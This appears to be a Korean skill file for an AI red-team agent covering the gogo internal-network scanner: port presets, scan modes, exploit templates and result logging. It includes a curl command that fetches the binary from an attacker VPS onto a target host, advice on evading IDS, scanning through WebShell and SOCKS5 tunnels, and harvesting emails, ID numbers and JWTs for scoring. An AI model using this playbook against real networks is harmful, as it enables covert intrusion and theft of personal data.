---
name: gogo-intranet
description: gogo v2.15.0 고성능 내부망 스캔 엔진: 스마트/초스마트 모드, 능동+수동 지문, 핵심 정보 추출(title/인증서/JWT/메일/신분증), nuclei 템플릿 POC, 전송량 제어로 낮은 노이즈
whenToUse: 내부망에 진입한 뒤 큰 대역(/16 /12)을 빠르게 매핑해야 할 때, 지문과 핵심 정보가 필요할 때, 되도록 적게 보내고 들키지 않아야 할 때
role: internal
enabled: true
---

# gogo(내부망 매핑과 지문 엔진)

`gogo` = **고동시성 · 저노이즈 · 고도로 설정 가능한 매핑 엔진**. ChainReactors 제작이며 레드팀 내부망 시나리오를 위해 설계되었다:
최소 전송 원칙, 능동+수동 지문, 핵심 정보 추출, 커널 수준 POC 엔진(neutron, nuclei 템플릿 호환),
DSL/workflow 사용자 정의 지원. **먼저 gogo 로 면을 깔고, 다음 fscan 으로 지점을 친다.**

## fscan 과의 역할 분담

| | gogo | fscan |
| --- | --- | --- |
| 강점 | 큰 대역 매핑, 지문, 정보 추출, 전송량 제어 | 약한 비밀번호 브루트포스, 무단 접근, 고위험 취약점, 익스플로잇 |
| 기본 노이즈 | 낮음(`--opsec`, 스레드/타임아웃 조정 가능) | 높음(600 스레드 + 브루트포스 + POC 전부 켜짐) |
| 출력 | `.dat`(deflate JSON Lines) + 포맷 정리 | txt/json/csv |
| 전형적 사용 | `gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af` | `fscan -h 10.0.0.0/24 -nobr -nopoc` |

## 바이너리

```
로컬 : $DSH_HOME/redteam/toolkit/gogo/gogo                (v2.15.0, 4.3MB, 지문 3138개 내장)
       $DSH_HOME/redteam/toolkit/gogo/gogo_windows_amd64.exe
       $DSH_HOME/redteam/toolkit/gogo/gogo_linux_arm64
VPS  : http://<VPS_IP>:9100/gogo                          (스킬 vps-reverse-shell 의 페이로드 디렉터리)
문서 : https://chainreactors.github.io/wiki/gogo/
템플릿 : https://github.com/chainreactors/templates

# 점프 호스트/대상으로 옮겨 실행
curl -o gogo http://<VPS_IP>:9100/gogo && chmod +x gogo
```

설치 스크립트는 gogo 를 내려받지 않으므로 직접 메인 파일 경로에 넣어야 한다. Windows 와 ARM 파일도 마찬가지로 직접 채워야 하고, 현재 플랫폼에서는 위의 메인 파일만 쓴다.

**의존성 없음**: 단일 정적 바이너리이고 지문과 추출 규칙이 모두 내장되어 Windows 2003 에서도 돈다. 별도 설정 파일은 **필요 없다**.

## 규율

1. **범위**: `--exclude` / `--exclude-file` 로 승인 범위 밖 대역을 제외한다. 사무망과 클라우드 메타데이터 대역을 스캔하지 않는다.
2. **먼저 길을 살핀 뒤 스캔**: `ip a; ip route; arp -a; cat /etc/hosts` —— 내부망 토폴로지를 알면 스캔 절반을 아낄 수 있다.
3. **OPSEC**: 민감한 환경에서는 `--opsec` 을 붙이고 스레드를 `-t 200~500` 으로 낮추며 타임아웃 `-d 3`; 큰 대역은 반드시 `--ping` 으로 먼저 걸러낸다.
4. **큰 대역에 `-p -`(전체 포트) 스캔은 금지**한다. 그것은 자살 전송이다; 먼저 `top2` 로 훑고 살아 있는 호스트에만 전체 포트를 건다.

## 핵심 개념

### 포트 프리셋(이 도구의 핵심)

```bash
gogo -P port        # 전체 프리셋 tag 와 대응 포트 목록
```

자주 쓰는 tag: `top1`(80,443,8080) · `top2`(수백 개의 흔한 Web/서비스 포트) · `top3` · `common`(내부망 상용) ·
`win`(135,137,445,3389,winrm,oxid) · `db` · `http` · `docker` · `oracle` · `smb` · `all`(전체)

```bash
p 조합: -p top2,win,db          # 쉼표로 임의 조합
p 범위: -p 1-1000               # 구간
p 전체: -p -                    # 1-65535 와 같다(주의해서 사용)
p 단일: -p 6379,mysql,12345
```

### 세 가지 스캔 모드

| 모드 | 인자 | 적용 |
| --- | --- | --- |
| default | (기본) | 단일 IP / 작은 대역(/24 이내) |
| smart | `-m s` | /24~/16, AB 블록 탐침 + 휴리스틱 확산 |
| supersmart | `-m ss` | /16 이상 대형 내부망, 먼저 점을 찍고 대역을 추린다 |
| sc | `-m sc` | 대상 대역을 이미 알고 더 세밀한 포트 커버가 필요할 때 |

```bash
gogo -i 192.168.1.0/24 -m s  --ping -p top2,win,db --af
gogo -i 10.0.0.0/8    -m ss --ping -p top2,win,db --af
```

### workflow(복잡한 명령을 프리셋으로 저장)

```bash
gogo -P workflow     # 전체 workflow 목록
gogo -w 10           # 10.0.0.0/8 supersmart 전체 흐름(all 포트)과 동일
gogo -w 172          # 172.16.0.0/12
gogo -w 192          # 192.168.0.0/16
gogo -w interc       # 내부망 상용 C 대역(10/172/192 세 구간)
gogo -w 10 -i 11.0.0.0/8 -p top2   # 명령행에서 workflow 인자를 덮어쓸 수 있다
```

## 인자 요약(실측 v2.15.0 `-h`)

> **여러 글자 긴 인자는 반드시 이중 하이픈**이다: `--ipp`, `--sp`, `--ef`, `--af`. 단일 하이픈은 `-i/-p/-m/-t/-d/-e/-v/-w/-F/-l/-L/-j` 같은 단일 문자에만 쓴다.

**입력**
```
-i/--ip   192.168.1.1/24,172.16.1.1/24   대상, 쉼표로 여러 개
--exclude 10.0.0.1/24        --exclude-file <file>
-l <file> 대상 목록 파일        -L   stdin 에서 대상 읽기
-j <file> 이전 결과(.dat) 또는 ip:port 목록 재사용, 계속 심화     -J   stdin 에서 읽기
```

**출력**
```
-f <file>        출력 파일명         --path   출력 디렉터리
-o <fmt>         명령행 출력 형식     -O <fmt>  파일 출력 형식(기본 jsonlines)
--af             출력 파일 자동 이름(.dat, deflate JSON Lines)
--hf             숨김 파일 자동 이름   -C  압축 해제      --tee  콘솔 출력도 함께 보존
-q/--quiet       로그를 끄고 결과만 남김(다른 도구와 연동할 때 필수)
-F <file>        기존 .dat 결과 포맷 정리
--filter / --output-filter / --scan-filter   이력 필터 / 실시간 필터 / 조기 중단
```

**스마트 스캔**
```
-m/--mod  default|s|ss|sc    스캔 모드
--ping                       먼저 ICMP 로 거르기(큰 대역은 필수)
-n/--no                      스마트 스캔만 하고 기본 스캔으로 넘어가지 않음
--sp   smart 포트 탐침(기본 80, ss 모드 기본 icmp)
--ipp  AB 블록 IP 탐침(기본 1,254)
```

**성능과 은밀성**
```
-t/--thread <n>     동시성(linux 기본 4000, 내부망에서는 200~1000 권장)
-d/--timeout <초>   타임아웃(기본 2)
-D/--ssl-timeout     SSL 타임아웃
--opsec             저노이즈 모드(민감한 환경에서 켠다)
-s/--spray          포트 우선 분사(포트 수 >500 이면 자동 활성)
--no-spray          분사 강제 해제
```

**지문과 추출**
```
-v/--verbose         능동 지문 식별(이것을 주지 않으면 수동 지문만 돌아 정보는 적지만 조용하다)
--ff <file>          사용자 지문 라이브러리
--extract "<regex>"  사용자 추출 정규식
gogo -P extract      내장 추출 규칙 보기(jwt / mail / idcard / phone / ip 등)
```

**취약점(neutron 커널)**
```
-e/--exploit         POC 스캔 시작(-v 와 함께 쓸 때는 -ev 로 쓴다)
-E <name>            템플릿 이름 지정        --ef <file>  템플릿 파일 지정
--payload <s>        payload 지정      --attack-type sniper|clusterbomb|pitchfork
```

**프록시**
```
--proxy socks5://127.0.0.1:11111      # 실측 사용 가능, suo5 / ssh -D 터널을 통과한다
```

## 표준 작업 흐름(SOP)

```bash
# 0) 길 살피기
ip a; ip route; arp -a; cat /etc/hosts /etc/resolv.conf

# 1) 큰 대역 매핑(조용하게, 먼저 생존 확인, 결과는 파일로)
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af -t 500 -d 3

# 2) 결과 보기(사람이 읽기 좋게)
./gogo -F ./.10.0.0.0_16_top2_win_db_ss_dat

# 3) 살아 있는 호스트에 전체 포트 + 능동 지문
./gogo -i 10.0.1.0/24 -p - -v -t 1000 -d 3 --af

# 4) 지목 POC(지문이 확인된 대상에만)
./gogo -i 10.0.1.5,10.0.1.9 -p top2 -ev -E <템플릿 이름>

# 5) 이전 단계 결과를 재사용해 계속 심화(다시 스캔하지 않는다)
./gogo -j ./step1.dat -p 1-65535 -v -e
```

### 터널을 통한 매핑(내부망 침투의 주 경로)

```bash
# 전제: 스킬 suo5-tunnel 로 socks5 를 세웠거나, vps-reverse-shell 에서 ssh -D 를 썼다
./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af \
       --proxy socks5://127.0.0.1:1080 -t 300 -d 5 -q

# 실측: gogo --proxy socks5:// 는 트래픽을 실제로 터널로 보낸다(VPS 를 경유해 잡힌 것은 VPS 의 SSH 지문이었다)
```

터널 상황에서는 `-t` 를 300 이내로 낮추고 `-d` 를 5 로 올린다. 아니면 터널이 패킷을 버려 오탐이 난다.

## 결과 적재(반드시 한다)

gogo 의 `.dat` 는 압축된 JSON Lines 이므로 먼저 포맷을 정리한 뒤 파싱해 적재한다:

```bash
./gogo -F ./result.dat -o json -f result.json      # JSON 으로 변환(실측 산출물 구조는 아래 참조)
python3 tools/parse.py result.json
# 파싱 요점: 최상위는 {config, ip, data:[...]} 이고, 각 항목은 ip/port/protocol/status/frameworks/title/timing 을 담는다
```
```python
import json
d = json.load(open('result.json', encoding='utf-8'))
for it in d.get('data', []):
    fw = ','.join((it.get('frameworks') or {}).keys())
    print(it.get('ip'), it.get('port'), it.get('protocol'), fw, it.get('title'))
# 실측 단일 항목: {"ip":"10.0.0.5","port":"22","protocol":"tcp","status":"open",
#             "frameworks":{"ssh":{"name":"ssh","attributes":{"version":"10.3p1"}}},
#             "title":"SSH-2.0-OpenS","timing":26}
```

```bash
# 적재 규율(fscan 과 동일)
redteam_asset_add      { engagement, ip, port, service, title, source: "gogo", tags: [...] }
redteam_web_list       # 이후 Web 지문 스킬이 URL/제목을 보완한다
redteam_vuln_add       { engagement, target, name, severity, evidence_ref }   # 증거 필수
```

**주의**: gogo 의 프레임워크/지문 결과는 `asset` 의 `fingerprint` 필드에 넣는다. 터미널에만 남기지 않는다.
스캔에서 추출된 민감 정보(메일/신분증/JWT)는 "대량 민감 정보" 득점 항목이므로 `redteam_vuln_add` +
`redteam_score_hit` 로 기록하고, 증거는 `runs/` 에 둔다.

## 문제 해결

| 증상 | 처리 |
| --- | --- |
| 인자 오류 | 긴 인자는 이중 하이픈(`--af`, `-af` 아님), `-P` 는 `port/workflow/neutron/extract` 만 받는다 |
| 결과 파일을 못 찾음 | `--af` 는 **바이너리와 같은 디렉터리**에 쓴다. `--path` 로 디렉터리를 지정한다 |
| 큰 대역에서 결과가 거의 없음 | `--ping` 은 ping 을 막은 호스트를 놓친다; `--ping` 을 빼거나 `--ipp` 로 탐침을 조정한다 |
| 스캔이 너무 느림 | `-t` 를 올리고 `-d` 를 내린다; `-p` 를 `top1`/`top2` 로 바꾼다; 큰 대역은 `-m ss` |
| IDS 에 걸림 | `--opsec` + `-t 200` + `-d 3`; `-e` 를 켜지 않는다; `-p -` 를 쓰지 않는다 |
| 터널에서 대량 타임아웃 | `-t` 를 낮추고 `-d` 를 올린다. 터널 대역폭이 병목이다 |
| 로그 없이 결과만 보고 싶다 | `-q`(다른 도구와 연동할 때 필수) |

## 관련 스킬

- `fscan-intranet`: 면을 깐 뒤의 브루트포스와 익스플로잇
- `suo5-tunnel`: WebShell → SOCKS5, gogo 에 `--proxy` 진입점을 제공한다
- `vps-reverse-shell`: 터널과 페이로드 전달
- `web-fingerprint` / `asset-correlation`: gogo 결과를 자산 그래프로 더 연결한다
